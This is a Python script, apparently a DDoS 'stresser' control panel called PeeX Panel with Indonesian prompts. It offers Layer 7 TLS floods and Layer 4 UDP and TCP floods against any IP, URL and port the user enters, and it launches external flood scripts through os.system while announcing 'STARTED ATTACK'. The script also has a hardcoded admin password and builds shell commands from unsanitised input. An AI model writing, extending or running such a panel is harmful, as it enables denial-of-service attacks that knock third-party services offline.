import os
import platform

def colored(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

RED = "91;1"
GREEN = "92;1"
YELLOW = "93;1"
BLUE = "94;1"
PINK = "95;1"
WHITE = "97;1"
BOLD_GREEN_BOX = "\033[1;42m"
RESET = "\033[0m"

def is_root():
    if platform.system() == "Windows":
        return False  
    return os.geteuid() == 0

def login():
    correct_username = "admin"
    correct_password = "bu"

    print(colored("Silakan login untuk mengakses panel.", GREEN))
    username = input("Username: ")
    password = input("Password: ")

    if username == correct_username and password == correct_password:
        return username
    else:
        print(colored("Username atau password salah. Akses ditolak.", RED))
        return None

def welcome_screen(username):
    root_status = "Yes" if is_root() else "No"
    root_color = GREEN if root_status == "Yes" else RED

    print(colored("""
⠀⠀    ██████╗ ███████╗███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██╗███████╗██████╗ 
    ██╔══██╗██╔════╝██╔════╝╚██╗██╔╝    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔══██╗
    ██████╔╝█████╗  █████╗   ╚███╔╝     ██████╔╝███████║██╔██╗ ██║█████╗  ██████╔╝
    ██╔═══╝ ██╔══╝  ██╔══╝   ██╔██╗     ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝  ██╔═══╝ 
    ██║     ███████╗███████╗██╔╝ ██╗    ██║     ██║  ██║██║ ╚████║███████╗██║     
    ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     
""", GREEN))
    print(colored("Welcome To PeeX Panel", GREEN))
    print(f"[ Username : {colored(username, RED)} ]")
    print(f"[ Rooted : {colored(root_status, root_color)} ]")
    print(colored("[          TYPE HELP TO SHOW MENU           ]", YELLOW))

def show_help():
    print(colored("""
⠀⠀⠀⠀⠀⠀⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀
⠀⠀⠀⠀⠀⢀⡇⠀⡀⠀⠀⠀⢸⠈⢻⡄⠀⢷⣿⠀⠀⠀⠀⢹⡏⣇⠀⣀⣀⠀⣿⣧⠀⢸⠾⣇⣠⣄⣸⣿⡄⠀⠘⡆⠀⠀⠀⠀⠆⠀
⠀⠀⠀⠀⠀⣾⢿⠀⠇⠀⠀⠀⢸⠀⠀⢳⡀⢸⣿⡆⠀⠀⠀⣬⣿⡿⠟⠋⠉⠙⠻⣽⣀⡏⠀⠙⠃⢹⡙⡿⣷⠀⠀⢹⠀⠀⠀⠀⠰⠒
⠀⠀⠀⠀⢸⣿⣿⣇⢸⠀⠀⠀⢸⣦⣤⡀⣷⣸⡟⢧⣀⡴⠶⠿⠻⡄⣀⣤⣴⡾⠖⠚⠿⡀⠀⠀⠀⠈⣧⠁⠹⠆⠀⠀⣇⠀⠀⠀⠀⠀
⠀⠀⠀⢀⢸⣀⣼⣿⣼⡆⠀⢀⡘⡇⠀⠀⠹⡟⢷⡜⢉⣠⣠⣠⣀⣤⡿⣛⣥⣶⣾⡿⠛⠿⠿⣶⣦⡤⢹⠀⢀⠀⠀⠀⢹⡄⠀⠀⠀⠀
⠀⠀⠀⢸⢸⡛⠁⠀⠙⢿⠋⠉⠉⠻⠀⠀⠀⢿⣄⠈⠁⠀⠀⠀⢉⢟⣴⡿⠿⠟⢁⠇⠀⠀⠀⠀⠹⣿⠻⡇⢸⠀⠀⠀⠈⣷⠀⠀⠀⠀
⠀⣀⣀⣘⣿⡇⠀⢀⣠⣤⣶⣶⣶⣾⣦⡀⠀⠈⡿⠀⠀⠀⠀⠀⠀⣿⠟⠳⠦⡤⠊⠀⠀⠀⠀⠀⣸⠇⠀⡇⣼⠀⢰⠀⠀⢹⣇⠀⠀⠀
⠛⠁⠈⣿⣷⣧⣴⣿⠿⠛⣿⠿⣿⣿⡿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⣠⣴⣶⠿⠿⠿⡷⢛⠕⠷⡄⣧⣿⠀⢸⠀⠀⠸⣿⡄⠀⠀
⠀⠀⢠⣿⢿⣿⣿⠁⠀⠀⠈⠳⠤⠶⠃⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠟⣱⠒⡠⢆⡴⣣⣯⢞⣴⡟⢿⡄⡏⠀⠀⠀⡏⢷⡀⠀
⠀⠀⡌⣿⠀⠙⣿⡦⢀⣤⡴⣶⠖⣲⠆⢀⠞⠁⠱⠀⠀⠀⠀⠀⠠⣾⠟⠛⡡⠞⠁⢀⡴⢋⢎⣽⡿⣫⠋⠀⠘⢷⠃⡄⠀⠀⡇⠈⣿⡀
⠀⠀⣇⢹⣦⠀⠼⢃⡾⢋⣶⢃⡼⣹⡳⠃⠊⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⠠⠋⠀⡰⠋⠀⢘⣇⡇⠀⢠⠟⠀⡇⠀⠀⠀⠀⢹⡵
⠀⠀⢻⣌⢿⡆⠀⡝⣼⠟⣩⢏⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠈⠀⣠⠏⣠⣾⡇⠀⠀⠀⠀⠘⣷
⡀⠀⢸⣿⣿⣷⠆⢠⠏⡴⠃⡡⠋⠀⠀⠀⠀⠀⠀⣀⣠⠤⠔⠒⠤⣄⣀⠀⠀⢀⣰⠏⠀⠀⠀⠀⢀⣠⡾⠗⠋⢰⠏⡇⠀⠀⠘⠀⠰⢻
⣇⠀⠘⣿⣿⣟⠻⣄⡞⠀⠐⠁⠀⠀⠀⠀⠀⣠⠞⣩⣤⣶⣶⣾⣷⣶⣬⣿⣿⣿⡏⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⢸⡆⡇⠀⠀⠀⠀⠀⠀
⠹⡄⠀⠹⣿⣿⡄⠀⠉⠉⠀⡀⠀⠀⠈⢻⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⣧⠀⠀⠀⠀⠀⠀
⠀⣿⢦⣀⠘⢿⣷⡀⠀⠀⡀⢦⠀⠀⠀⠀⠹⣿⣿⠏⠙⢻⣿⡿⠛⠉⠀⠸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠀⠀⡆⠀⠀⡀
⢼⣿⠀⠈⢳⣤⣉⣻⣤⣀⣉⣩⠆⠀⠀⠀⠀⠹⡿⠀⠀⠈⡿⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠓⠂⠀⣠⣾⣿⣿⡿⢿⡄⠀⣧⠀⠀⠹
⣾⠃⠀⣠⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⡇⠀⠀⢠⠴⣿⡄⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡿⣧⣀⠧⣰⣻⢄⠀⠀
⠛⠶⢾⣿⣽⣭⣽⣭⢹⣷⠀⢹⣦⣀⠀⠀⠀⠀⡄⠀⠀⣸⡀⠀⠀⠁⣰⣧⣽⠀⠀⠀⠀⢀⣴⣾⣿⣿⡟⣻⣿⣿⣿⣿⢠⣿⣧⡸⣷⣄
⠀⠀⠀⠈⠙⠿⣿⣿⣿⠏⠀⣾⣿⣿⣷⣦⣀⠀⢇⠀⠀⠈⠁⠀⣠⠔⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⣼⣿⠏⣷⡈⠉
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣤⡀⠀⠀⠀⠀⠀⠈⣳⠀⣿⠛⠻⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡯⠀⠀⠀
====================================
1. [ LAYER7 ]
2. [ LAYER4 ]
====================================
""", GREEN))

def layer7_menu():
    print(colored("""
     __     __   _  _  ____  ____    ____ 
(  )   / _\ ( \/ )(  __)(  _ \  (__  )
/ (_/\/    \ )  /  ) _)  )   /    / / 
\____/\_/\_/(__/  (____)(__\_)   (_/  
====================================
         LAYER7 METHODS
====================================
1. [ TLS ]
Cara menggunakan:
tls <url> <time> <req> <thread> proxy.txt
====================================
""", YELLOW))

def layer4_menu():
    print(colored("""
__     __   _  _  ____  ____     ___ 
(  )   / _\ ( \/ )(  __)(  _ \   / _ \
/ (_/\/    \ )  /  ) _)  )   /  (__  (
\____/\_/\_/(__/  (____)(__\_)    (__/

====================================
         LAYER4 METHODS
====================================
1. [ UDP ]
2. [ TCP ]
Cara menggunakan:
{methods} <IP> <port> <time> proxy.txt
====================================
""", YELLOW))

def run_udp(ip, port, duration, proxy_file):
    if not os.path.exists("udp.py"):
        print(colored("Maaf Tidak Dapat Menemukan File udp.py Di Dalam Directory", RED))
        return

    print(colored("====================================", GREEN))
    print(colored(f"  METHODS: UDP", BLUE))
    print(colored(f"  IP: {ip}", RED))
    print(colored(f"  PORT: {port}", YELLOW))
    print(colored(f"  TIME: {duration}", PINK))
    print(colored(f"  FILE: {proxy_file}", WHITE))
    print(colored("  [ STARTED ATTACK ]", BOLD_GREEN_BOX))
    os.system(f"python udp.py {ip} {port} {duration} {proxy_file}")

def run_tcp(ip, port, duration, proxy_file):
    if not os.path.exists("tcp.py"):
        print(colored("Maaf Tidak Dapat Menemukan File tcp.py Di Dalam Directory", RED))
        return

    print(colored("====================================", GREEN))
    print(colored(f"  METHODS: TCP", BLUE))
    print(colored(f"  IP: {ip}", RED))
    print(colored(f"  PORT: {port}", YELLOW))
    print(colored(f"  TIME: {duration}", PINK))
    print(colored(f"  FILE: {proxy_file}", WHITE))
    print(colored("  [ STARTED ATTACK ]", BOLD_GREEN_BOX))
    os.system(f"python tcp.py {ip} {port} {duration} {proxy_file}")

def run_tls(url, time, req, thread, proxy_file):
    if not os.path.exists("tls.py"):
        print(colored("Maaf Tidak Dapat Menemukan File tls.py Di Dalam Directory", RED))
        return

    print(colored("====================================", GREEN))
    print(colored(f"  METHODS: TLS", BLUE))
    print(colored(f"  URL: {url}", RED))
    print(colored(f"  TIME: {time}", YELLOW))
    print(colored(f"  REQ: {req}", PINK))
    print(colored(f"  THREAD: {thread}", WHITE))
    print(colored(f"  FILE: {proxy_file}", WHITE))
    print(colored("  [ STARTED ATTACK ]", BOLD_GREEN_BOX))
    os.system(f"python tls.py {url} {time} {req} {thread} {proxy_file}")

def main():
    username = login()
    if not username:
        return

    welcome_screen(username)

    while True:
        command = input("peex@localhost > ").strip().lower()
        if command in ["exit", "quit"]:
            print(colored("Exiting PeeX Panel. Goodbye!", GREEN))
            break
        elif command == "help":
            show_help()
        elif command == "layer7":
            layer7_menu()
        elif command.startswith("tls"):
            parts = command.split()
            if len(parts) == 6:
                _, url, time, req, thread, proxy_file = parts
                run_tls(url, time, req, thread, proxy_file)
            else:
                print(colored("Usage: tls <url> <time> <req> <thread> proxy.txt", RED))
        elif command == "layer4":
            layer4_menu()
        elif command.startswith("udp"):
            parts = command.split()
            if len(parts) == 5:
                _, ip, port, duration, proxy_file = parts
                run_udp(ip, port, duration, proxy_file)
            else:
                print(colored("Usage: udp <IP> <port> <time> proxy.txt", RED))
        elif command.startswith("tcp"):
            parts = command.split()
            if len(parts) == 5:
                _, ip, port, duration, proxy_file = parts
                run_tcp(ip, port, duration, proxy_file)
            else:
                print(colored("Usage: tcp <IP> <port> <time> proxy.txt", RED))
        else:
            print(colored("Unknown command. Type 'help' for usage.", RED))

if __name__ == "__main__":
    main()
